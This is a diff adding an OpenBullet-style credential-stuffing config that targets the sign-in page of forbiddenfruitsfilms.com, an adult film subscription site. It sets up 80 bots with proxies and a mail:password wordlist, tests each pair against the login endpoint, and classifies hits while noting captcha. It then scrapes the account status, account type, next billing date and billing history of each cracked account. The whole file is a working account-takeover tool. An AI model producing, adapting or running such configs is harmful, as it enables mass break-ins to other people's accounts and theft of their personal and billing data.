@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Forbiddenfruitsfilms",
+  "SuggestedBots": 80,
+  "LastModified": "2018-12-18T10:57:47.7337072+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ora",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 1801034073
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.forbiddenfruitsfilms.com/Membership/SubscriptionSignIn" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.forbiddenfruitsfilms.com" 
+  HEADER "referer: https://www.forbiddenfruitsfilms.com/member-sign-in" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+#KEY_CHECK_ KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure AND 
+    KEY "{\"success\":false," 
+    KEY "<SOURCE>" DoesNotContain "\"requirescaptcha\":true" 
+  KEYCHAIN Success AND 
+    KEY "{\"success\":true," 
+#GET_Free REQUEST GET "https://www.forbiddenfruitsfilms.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.forbiddenfruitsfilms.com/activate" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "accept-language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+#KEY_CHECK_Free KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Activate" 
+#Get REQUEST GET "https://www.forbiddenfruitsfilms.com/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Status PARSE "<SOURCE>" CSS "body#body h3" "innerHTML" 0 -> CAP "Status" "" "" 
+#Current_Account_Type PARSE "<SOURCE>" CSS "body#body div:nth-child(4) > div > div.text-xs-right > p > strong" "innerHTML" 0 -> CAP "Current Account Type" "" "" 
+#Next_Billing_Date PARSE "<SOURCE>" LR "
+						
+							" "
+						
+					<" Recursive=FALSE -> CAP "Next Billing" "" "" 
+REQUEST GET "https://www.forbiddenfruitsfilms.com/account/history" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Billing_History_Date PARSE "<SOURCE>" CSS "body#body tbody > tr:nth-child(n) > td:nth-child(2)" "innerHTML" Recursive=TRUE -> CAP "Billing History Date" "" "" 
+#Billing_History_Amount_Charged PARSE "<SOURCE>" CSS "body#body tbody > tr:nth-child(n) > td.text-xs-right" "innerHTML" Recursive=TRUE -> CAP "Amount Charged" "" "" 
